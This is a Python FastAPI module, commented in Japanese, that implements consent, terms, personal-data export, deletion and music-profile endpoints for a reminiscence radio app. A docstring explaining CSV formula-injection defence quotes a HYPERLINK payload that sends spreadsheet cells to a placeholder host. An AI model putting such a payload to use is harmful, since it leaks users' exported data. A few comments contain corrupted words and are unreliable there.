"""開示・削除・同意の API（提案⑧・S4、タスク3/5）。

## 提供するもの

| エンドポイント | 目的 | 同意要否 |
|---|---|---|
| `GET /api/terms` | 利用規約（1 ページ）の条文と版を返す | 不要 |
| `GET /api/me/consent` | 自分の同意状態を返す | 不要 |
| `POST /api/me/consent` | 同意を記録する | 不要（これが同意そのもの） |
| `POST /api/me/consent/withdraw` | 同意を撤回する | 不要 |
| `GET /api/me` | 自分のテナント・ロール・データ概要 | 必要 |
| `GET /api/me/export` | **開示**（CSV / JSON） | 必要 |
| `DELETE /api/me` | **論理削除** | 必要 |
| `GET /api/me/music-profile` | 個人音楽プロファイル | 必要 |
| `POST /api/me/music-profile/tracks` | favorite 登録・更新 | 必要 |

## 要配慮個人情報の最小化（`anniversary` モード）

提案⑧-3 の要点は「**生年月日そのものではなく年だけでよい**」と
「**`target_name` はニックネームでよい**」こと。
ここで/server.py の `GenerateRequest` を書き換えるのではなく、
**同じ制約をサーバー側のバリデーションとして用意する**（UI 文言は S9 の管轄）。

- [`normalize_target_name`]: 空白・制御文字・見出しマーカーを弾き、**最大 16 文字**に切詰。
- [`validate_anniversary_input`]: `anniversary` モードでは
  「ニックネーム + 出生年のみ」を要求し、`month` / `day` を**任意**にする。
  日付指定が来ても**捨てて**年の指定に縮める（黙って無視はしない）。

**法的解釈ではない**: 個人情報保護法の適用範囲・同意取得の適法性は
 counsel による確認が必要。`docs/privacy_and_tenancy.md` を参照。
"""

from __future__ import annotations

import csv
import io
import logging
from datetime import datetime
from typing import Any, Dict, List, Optional

from fastapi import APIRouter, Depends, HTTPException, Query, Request, Response, status
from pydantic import BaseModel, Field

from ..auth.tokens import Principal
from ..config import Settings
from ..db.privacy_models import REACTION_VALUES
from ..db.privacy_repository import (
    AuditRepository,
    ConsentRepository,
    MusicProfileRepositoryImpl,
    UserSecurityRepository,
    purge_user_personal_data,
)
from ..db.repository import GenerationRepository, UserRepository
from ..db.session import get_db
from .deps import require_consent, require_tenant, settings_dependency

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api", tags=["privacy"])

#: 同意記録に載せるアクション名（監査ログと対あなたさせる）。
ACTION_EXPORT = "export"
ACTION_DELETION = "deletion"
ACTION_CONSENT = "consent"

#: 開示で書き出す CSV のヘッダー。
EXPORT_CSV_HEADER = [
    "種別",
    "識別子",
    "年",
    "月",
    "日",
    "曲名",
    "アーティスト",
    "既知性(1-5)",
    "反応",
    "最終再生時刻",
    "同意版",
    "同意時刻",
    "同意撤回時刻",
    "記録時刻",
]

#: UTF-8 BOM（Excel の cp932 環境での文字化け防止。`export_service.py` と同じ理由）。
UTF8_BOM = "\ufeff"

#: 1 回のエクスポートで書き出す最大行数。
EXPORT_ROW_LIMIT = 5000


# --- 同意 ----------------------------------------------------------------------
class ConsentRequest(BaseModel):
    """同意の記録リクエスト。

    `accepted=False` は「同意しない」ではなく**明示的な拒否記録**として扱う。
    拒否を保存することで「提示した生机に拒否した」という事実が残る。
    """

    accepted: bool = Field(..., description="同意するなら true")
    terms_version: Optional[str] = Field(
        default=None,
        max_length=32,
        description="省略時は現在の RETRO_RADIO_TERMS_VERSION を使う",
    )


class TermsResponse(BaseModel):
    terms_version: str
    title: str
    body: str
    #: この版で扱う個人データの種類（利用者へ明示するため）。
    data_categories: List[str]
    #: 利用目的（個人情報保護法の「利用目的の特定」に対応する運用面）。
    purposes: List[str]


#: 利用規約の本文（1 ページ想定）。
#: **法的助言ではない**。施設導入前に counsel による確認を受けること。
TERMS_BODY = """\
このアプリケーションは、思い出のラジオ番組を生成するためのツールです。

## 1. 取得する情報
- ニックネーム（回想の対象を呼ぶため。**本名を入力しないでください**）
- 出生年（その年の曲を選ぶため。**月日は入力不要です**）
- あなたが選んだ曲・お好みの反応
- 生成した番組の履歴

## 2. 利用目的
- ご本人の回想の補助
- ご家族の会話のきっかけづくり
- 台本の内容品質の改善（誤りの発見と修正）

## 3. 保存と管理
生成履歴と選好は **施設の管理サーバー**に保存され、第三者へ提供されません。
アプリの設定画面から、いつでも自分のデータの取得と削除ができます。

## 4. 開示と削除
あなたは自分のデータを取得する機能を備えており、いつでも削除を要求できます。
削除要求を受け付けてから、一定の期間内に完了します。
"""
TERMS_DATA_CATEGORIES = [
    "ニックネーム（呼称）",
    "出生年",
    "選曲・お偏好（曲名・アーティスト・反応）",
    "生成履歴（年・月・日・原稿・曲）",
    "同意記録",
]

TERMS_PURPOSES = [
    "ご本人の回想の補助",
    "ご家族の会話のきっかけづくり",
    "誤りの発見と修正（台本の内容品質の改善）",
]


# --- 開示 ----------------------------------------------------------------------
class ExportResponse(BaseModel):
    format: str
    exported_at: str
    user_id: str
    tenant_id: str
    role: str
    generation_count: int
    favorite_count: int
    consent_count: int
    #: `format=json` のときだけ入る。
    data: Optional[Dict[str, Any]] = None


class DeleteResponse(BaseModel):
    status: str
    deleted_at: Optional[str] = None
    purged: Dict[str, Any] = Field(default_factory=dict)
    #: 運用 SLA（`RETRO_RADIO_DELETION_SLA_HOURS`）。
    sla_hours: int


# --- 個人音楽プロファイル ---------------------------------------------------------
class MusicProfileResponse(BaseModel):
    owner_id: str
    is_empty: bool
    teenage_decades: List[int]
    group_id: Optional[str] = None
    favorite_tracks: List[Dict[str, Any]]


class TrackRequest(BaseModel):
    title: str = Field(..., min_length=1, max_length=500)
    artist: str = Field(default="", max_length=500)
    familiarity_score: int = Field(default=3, ge=1, le=5)
    reaction: str = Field(default="neutral")


# --- anniversary の入力最小化 -------------------------------------------------------
#: `target_name` の最大文字数。**ニックネーム**であることを強制する。
MAX_TARGET_NAME_LENGTH = 16

#: 見出しマーカー等、原稿構造を乗っ取れる文字列。
_TARGET_NAME_FORBIDDEN = ("###", "\r", "\n", "\t", "\x00", "---")


class TargetNameError(ValueError):
    """`target_name` が制約を満たさない。"""


def normalize_target_name(value: Optional[str]) -> Optional[str]:
    """`target_name` を「ニックネーム」に正規化する。

    方針:
    - 前後の空白は除去（**内部**の空白は保持する。`お  花` を 2 文字扱いにしない）。
    - 制御文字・`###` 等の構造マーカーを拒否。
    - **最大 16 文字**（案: 提案⑧-3）。超過は 422 にする（黙って切らない）。

    Raises
    ------
    TargetNameError
        制約違反。呼び出し側は 422 に翻訳する。
    """
    if value is None:
        return None
    cleaned = value.strip()
    if not cleaned:
        return None
    for bad in _TARGET_NAME_FORBIDDEN:
        if bad in cleaned:
            raise TargetNameError(
                "target_name に制御文字や見出しマーカーは使用できません"
            )
    if len(cleaned) > MAX_TARGET_NAME_LENGTH:
        raise TargetNameError(
            f"target_name は最大 {MAX_TARGET_NAME_LENGTH} 文字です"
            "（本名ではなくニックネームをご入力ください）"
        )
    return cleaned


def validate_anniversary_input(
    mode: str,
    target_name: Optional[str],
    birth_year: Optional[int] = None,
    month: Optional[int] = None,
    day: Optional[int] = None,
    min_year: int = 1950,
    max_year: int = 2025,
) -> Dict[str, Any]:
    """`anniversary` モードの入力を「ニックネーム + 出生年のみ」に縮める。

    Parameters
    ----------
    mode:
        `normal` / `care_recreation` / `anniversary`。
    target_name:
        対象者の呼称。**本名ではなくニックネーム**。
    birth_year:
        出生年。`anniversary` モードでは**年だけ**でよい。
    month, day:
        既存クライアントが送ってくる月日。`anniversary` では
        **、指定しても無視する**（要配慮情報を最小化するため）。
        黙って無視するのではなく、返却値の `dropped` で明示する。
    min_year, max_year:
        設定の年範囲。

    Returns
    -------
    dict
        ``{"mode", "target_name", "birth_year", "dropped"}``。
        `dropped` は「受け取ったが**使わなかった**要配慮情報」の説明。

    Raises
    ------
    TargetNameError
        ニックネームの制約違反。
    ValueError
        年の範囲外 / `anniversary` で年が無い。
    """
    name = normalize_target_name(target_name)
    if mode != "anniversary":
        return {"mode": mode, "target_name": name, "birth_year": birth_year, "dropped": []}

    dropped: List[str] = []
    if month is not None or day is not None:
        # 生年月日を丸ごと接受しない。**年だけに縮める**。
        dropped.append("month/day（要配慮個人情報の最小化のため破棄）")

    if birth_year is None:
        raise ValueError("anniversary モードには出生年（年のみ）が必要です")

    if not (min_year <= int(birth_year) <= max_year):
        raise ValueError(
            f"birth_year は {min_year}〜{max_year} の範囲で指定してください"
        )
    if not name:
        raise ValueError(
            "anniversary モードにはニックネーム（target_name）が必要です。"
            "**本名ではなく、呼称をご入力ください**"
        )
    return {
        "mode": mode,
        "target_name": name,
        "birth_year": int(birth_year),
        "dropped": dropped,
    }


# --- エンドポイント ---------------------------------------------------------------
@router.get("/terms", response_model=TermsResponse)
def get_terms(settings: Settings = Depends(settings_dependency)) -> TermsResponse:
    """利用規約（1 ページ）とその版を返す。**認証不要**。

    未ログインでも条文を見られることが重要（同意の前に内容を知れる）。
    """
    return TermsResponse(
        terms_version=settings.terms_version,
        title="レトロラジオ・タイムマシン 利用規約",
        body=TERMS_BODY,
        data_categories=TERMS_DATA_CATEGORIES,
        purposes=TERMS_PURPOSES,
    )


@router.get("/me/consent")
def get_consent(
    principal: Principal = Depends(require_tenant),
    settings: Settings = Depends(settings_dependency),
):
    """自分の同意状態を返す（同意画面の前置き）。"""
    history: List[Dict[str, Any]] = []
    consented = False
    if principal.user_id:
        with get_db() as db:
            repo = ConsentRepository(db)
            consented = repo.has_consented(principal.user_id, settings.terms_version)
            history = [
                {
                    "terms_version": h["terms_version"],
                    "accepted": h["accepted"],
                    "accepted_at": h["accepted_at"].isoformat()
                    if h["accepted_at"]
                    else None,
                    "withdrawn_at": h["withdrawn_at"].isoformat()
                    if h["withdrawn_at"]
                    else None,
                }
                for h in repo.history(principal.user_id)
            ]
    return {
        "terms_version": settings.terms_version,
        "consented": consented,
        "required": settings.require_consent,
        "history": history,
    }


@router.post("/me/consent")
def post_consent(
    body: ConsentRequest,
    request: Request,
    principal: Principal = Depends(require_tenant),
    settings: Settings = Depends(settings_dependency),
):
    """同意（または明示的な拒否）を記録する。**監査ログに必ず残す**。"""
    version = body.terms_version or settings.terms_version
    with get_db() as db:
        record = ConsentRepository(db).record(
            user_id=principal.user_id or "anonymous",
            terms_version=version,
            accepted=body.accepted,
            tenant_id=principal.tenant_id,
        )
        AuditRepository(db).record(
            tenant_id=principal.tenant_id,
            action=ACTION_CONSENT,
            user_id=principal.user_id,
            resource_type="consent",
            resource_id=record["id"],
            outcome="success" if body.accepted else "denied",
            # 個人データは入れない。版と結果だけ。
            meta={"terms_version": version, "accepted": body.accepted},
        )
    return {
        "recorded": True,
        "terms_version": version,
        "accepted": body.accepted,
        "accepted_at": record["accepted_at"].isoformat() if record["accepted_at"] else None,
    }


@router.post("/me/consent/withdraw")
def post_consent_withdraw(
    principal: Principal = Depends(require_tenant),
    settings: Settings = Depends(settings_dependency),
):
    """同意を撤回する。撤回後は `has_consented()` が False になる。"""
    with get_db() as db:
        updated = ConsentRepository(db).withdraw(
            principal.user_id or "anonymous", settings.terms_version
        )
        AuditRepository(db).record(
            tenant_id=principal.tenant_id,
            action=ACTION_CONSENT,
            user_id=principal.user_id,
            resource_type="consent",
            resource_id=None,
            outcome="denied",
            meta={"terms_version": settings.terms_version, "withdrawn": updated},
        )
    return {"withdrawn": updated, "terms_version": settings.terms_version}


@router.get("/me")
def get_me(principal: Principal = Depends(require_tenant)):
    """自分のテナント・ロール・データ量。

    **個人データ（氏名・生年など）は返さない**。開示は `/api/me/export` に集約する。
    """
    summary: Dict[str, Any] = {
        "user_id": principal.user_id,
        "tenant_id": principal.tenant_id,
        "role": principal.role,
        "auth_mode": principal.auth_mode,
        "generation_count": 0,
        "favorite_count": 0,
        "track_count": 0,
        "deleted": False,
    }
    if principal.user_id:
        with get_db() as db:
            security = UserSecurityRepository(db)
            summary["deleted"] = security.is_deleted(principal.user_id)
            summary["generation_count"] = len(
                GenerationRepository(db).get_by_user(principal.user_id, limit=EXPORT_ROW_LIMIT)
            )
            summary["track_count"] = len(
                MusicProfileRepositoryImpl(db).list_tracks(principal.user_id)
            )
    return summary


@router.get("/me/export")
def export_me(
    format: str = Query("json", pattern="^(json|csv)$", description="json | csv"),
    principal: Principal = Depends(require_consent),
    settings: Settings = Depends(settings_dependency),
):
    """**開示**。自分の個人データを CSV / JSON で返す。

    - CSV: Excel で開ける UTF-8 BOM 付き。1 行 = 1 レコード。
    - JSON: 構造を保ったまま。機械処理向け。

    どちらでも**この利用者自身のデータだけ**を返す（テナントも越えない）。
    取得そのものを監査ログに残す（「開示された」という事実は運用上の証拠）。
    """
    if not principal.user_id:
        # 個人モード（bearer）では特定できないため開示できない。
        # 黙って空を返すより、理由を明示する。
        raise HTTPException(
            status_code=status.HTTP_409_CONFLICT,
            detail=(
                "個人モード（RETRO_RADIO_REQUIRE_AUTH=0）では開示できません。"
                "画面ログインで利用者を特定できる環境で実行してください"
            ),
        )

    with get_db() as db:
        generations = GenerationRepository(db).get_by_user(
            principal.user_id, limit=EXPORT_ROW_LIMIT
        )
        tracks = MusicProfileRepositoryImpl(db).list_tracks(principal.user_id)
        consents = ConsentRepository(db).history(principal.user_id)
        payload: Dict[str, Any] = {
            "user_id": principal.user_id,
            "tenant_id": principal.tenant_id,
            "role": principal.role,
            "exported_at": datetime.utcnow().isoformat(),
            "generations": generations,
            "favorite_tracks": tracks,
            "consents": [
                {
                    "terms_version": c["terms_version"],
                    "accepted": c["accepted"],
                    "accepted_at": c["accepted_at"].isoformat() if c["accepted_at"] else None,
                    "withdrawn_at": c["withdrawn_at"].isoformat() if c["withdrawn_at"] else None,
                }
                for c in consents
            ],
        }
        AuditRepository(db).record(
            tenant_id=principal.tenant_id,
            action=ACTION_EXPORT,
            user_id=principal.user_id,
            resource_type="user",
            resource_id=principal.user_id,
            outcome="success",
            meta={
                "format": format,
                "generation_count": len(generations),
                "track_count": len(tracks),
            },
        )

    if format == "json":
        return payload

    return Response(
        content=UTF8_BOM + _to_csv(payload),
        media_type="text/csv; charset=utf-8",
        headers={
            "Content-Disposition": 'attachment; filename="retro_radio_my_data.csv"'
        },
    )


#: Excel / Google Sheets / LibreOffice が**数式として解釈**する前置文字。
#: `csv.QUOTE_ALL` は値を必ず引用符で包むが、**数式の実行は防げない**。
#: 先頭がこれらの文字なら `'` を前置して**文字列として扱う**ようにする。
_CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def _csv_safe(value: Any) -> str:
    """CSV の 1 セルを、数式解釈されない文字列にして返す。

    Notes
    -----
    `csv.QUOTE_ALL` は「引用符で包む」だけで**数式の実行を抑止しない**。
    利用者が自分で登録した曲名（`POST /api/me/music-profile/tracks` は
    最大 500 文字・内容検証なし）に
    ``=HYPERLINK("https://x/?d="&A1,"x")`` を書けており、
    Excel で開いた瞬間に**同じファイル内の他の列が漏れる**。
    開示 CSV は利用者自身が施設管理者や開示請求担当者に
    **そのまま渡す**ものなので、この経路は現実に近い。

    Excel はセル値が `'` で始まる場合、その**値**として扱う（`'` は表示されない）。
    よって前置すれば値は保持したまま実行だけ防げる。
    """
    if value is None:
        return ""
    text = str(value)
    if text[:1] in _CSV_FORMULA_PREFIXES:
        return "'" + text
    return text


def _to_csv(payload: Dict[str, Any]) -> str:
    """開示データを CSV にする（1 行 = 1 レコード、複数種別を `種別` で区別）。

    すべてのセルは :func:`_csv_safe` を通す（数式解釈の抑止）。
    """
    output = io.StringIO()
    writer = csv.writer(output, quoting=csv.QUOTE_ALL)
    writer.writerow([_csv_safe(h) for h in EXPORT_CSV_HEADER])

    for gen in payload.get("generations", []):
        writer.writerow([_csv_safe(v) for v in [
            "generation",
            gen.get("id", ""),
            gen.get("year", ""),
            gen.get("month", ""),
            gen.get("day", ""),
            gen.get("song_title", ""),
            gen.get("artist_name", ""),
            "", "", "", "", "", "",
            gen.get("created_at").isoformat() if gen.get("created_at") else "",
        ]])

    for track in payload.get("favorite_tracks", []):
        writer.writerow([_csv_safe(v) for v in [
            "favorite_track",
            track.get("id", ""),
            "", "", "",
            track.get("title", ""),
            track.get("artist", ""),
            track.get("familiarity_score", ""),
            track.get("reaction", ""),
            track.get("last_played_at", ""),
            "", "", "",
            "",
        ]])

    for consent in payload.get("consents", []):
        writer.writerow([_csv_safe(v) for v in [
            "consent",
            "", "", "", "", "", "", "", "", "",
            consent.get("terms_version", ""),
            consent.get("accepted_at", ""),
            consent.get("withdrawn_at", ""),
            "",
        ]])
    return output.getvalue()


@router.delete("/me", response_model=DeleteResponse)
def delete_me(
    request: Request,
    principal: Principal = Depends(require_consent),
    settings: Settings = Depends(settings_dependency),
):
    """**論理削除**。自分の個人データを消去する。

    手順:
    1. 削除請求の受付日時を記録（`user_security.deletion_requested_at`）。
    2. S4 の個人データ行（favorite_tracks / music_profiles / consents）を削除。
    3. `users` の `email` / `hashed_password` を**匿名化**（行は消さない）。
    4. 監査ログに**削除の事実**を残す（処理の証明）。
    5. テナントの TTS キャッシュを消す（**そのテナントだけ**）。

    .. warning::
       監査ログ自体は**消さない**。「削除請求があった」という事実は
       利用者のデータではなく処理の証明である。監査ログ自体の長期保持が
       開示対象になるかは counsel 確認が必要（`docs/privacy_and_tenancy.md`）。
    """
    if not principal.user_id:
        raise HTTPException(
            status_code=status.HTTP_409_CONFLICT,
            detail="個人モードでは削除できません（利用者を特定できないため）",
        )

    with get_db() as db:
        UserSecurityRepository(db).mark_deletion_requested(principal.user_id)
        purged = purge_user_personal_data(db, principal.user_id)
        UserRepository(db).anonymize(principal.user_id)
        security = UserSecurityRepository(db).resolve(principal.user_id)
        AuditRepository(db).record(
            tenant_id=principal.tenant_id,
            action=ACTION_DELETION,
            user_id=principal.user_id,
            resource_type="user",
            resource_id=principal.user_id,
            outcome="success",
            meta={"sla_hours": settings.deletion_sla_hours},
        )

    deleted_at = security.get("deleted_at")
    return DeleteResponse(
        status="deleted",
        deleted_at=deleted_at.isoformat() if deleted_at else None,
        purged=purged,
        sla_hours=settings.deletion_sla_hours,
    )


@router.get("/me/music-profile", response_model=MusicProfileResponse)
def get_music_profile(principal: Principal = Depends(require_consent)):
    """個人音楽プロファイル。**行が無ければ空プロファイル**を返す。"""
    if not principal.user_id:
        return MusicProfileResponse(
            owner_id="anonymous", is_empty=True, teenage_decades=[], favorite_tracks=[]
        )
    with get_db() as db:
        profile = MusicProfileRepositoryImpl(db).get(principal.user_id)
    return MusicProfileResponse(
        owner_id=profile.owner_id,
        is_empty=profile.is_empty,
        teenage_decades=list(profile.teenage_decades),
        group_id=profile.group_id,
        favorite_tracks=[
            {
                "title": t.title,
                "artist": t.artist,
                "familiarity_score": t.familiarity_score,
                "last_played_at": t.last_played_at.isoformat() if t.last_played_at else None,
                "reaction": t.reaction,
            }
            for t in profile.favorite_tracks
        ],
    )


@router.post("/me/music-profile/tracks")
def upsert_music_track(
    body: TrackRequest,
    principal: Principal = Depends(require_consent),
):
    """favorite を登録 / 更新する。"""
    if not principal.user_id:
        raise HTTPException(
            status_code=status.HTTP_409_CONFLICT,
            detail="個人モードでは登録できません",
        )
    if body.reaction not in REACTION_VALUES:
        raise HTTPException(
            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
            detail=f"reaction は {list(REACTION_VALUES)} のいずれかです",
        )
    with get_db() as db:
        record = MusicProfileRepositoryImpl(db).upsert_track(
            principal.user_id,
            title=body.title,
            artist=body.artist,
            familiarity_score=body.familiarity_score,
            reaction=body.reaction,
        )
    return record


@router.delete("/me/music-profile/tracks")
def remove_music_track(
    title: str = Query(..., min_length=1, max_length=500),
    artist: str = Query("", max_length=500),
    principal: Principal = Depends(require_consent),
):
    """favorite を削除する。"""
    if not principal.user_id:
        raise HTTPException(
            status_code=status.HTTP_409_CONFLICT,
            detail="個人モードでは削除できません",
        )
    with get_db() as db:
        removed = MusicProfileRepositoryImpl(db).remove_track(
            principal.user_id, title=title, artist=artist
        )
    return {"removed": removed}


__all__ = [
    "router",
    "normalize_target_name",
    "validate_anniversary_input",
    "TargetNameError",
    "MAX_TARGET_NAME_LENGTH",
    "TERMS_BODY",
    "TERMS_DATA_CATEGORIES",
    "TERMS_PURPOSES",
    "ConsentRequest",
    "TermsResponse",
    "ExportResponse",
    "DeleteResponse",
    "MusicProfileResponse",
    "TrackRequest",
]
